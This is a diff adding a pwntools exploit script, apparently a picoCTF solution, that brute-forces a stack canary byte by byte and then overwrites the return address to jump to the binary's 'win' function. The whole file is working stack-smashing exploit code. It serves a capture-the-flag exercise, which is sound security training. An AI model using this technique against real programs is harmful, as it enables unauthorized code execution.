@@ -1,0 +1,37 @@
+#!/usr/bin/env python3
+from pwn import *
+from string import printable
+
+elf = context.binary = ELF("./vuln", checksec=False)
+host, port = "saturn.picoctf.net", [PORT]
+offset = 64
+
+def new_process():
+    if args.LOCAL:
+        return process(elf.path)
+    else:
+        return remote(host, port)
+
+def get_canary():
+    canary = b""
+    logger = log.progress("Finding canary...")
+    for i in range(1, 5):
+        for char in printable:
+            with context.quiet:
+                p = new_process()
+                p.sendlineafter(b"> ", str(offset + i).encode())
+                p.sendlineafter(b"> ", flat([{offset: canary}, char.encode()]))
+                output = p.recvall()
+                if b"?" in output:
+                    canary += char.encode()
+                    logger.status(f'"{canary.decode()}"')
+                    break
+    logger.success(f'"{canary.decode()}"')
+    return canary
+
+canary = get_canary()
+p = new_process()
+payload = flat([{offset: canary}, {16: elf.symbols.win}])
+p.sendlineafter(b"> ", str(len(payload)).encode())
+p.sendlineafter(b"> ", payload)
+log.success(p.recvall().decode("ISO-8859-1"))
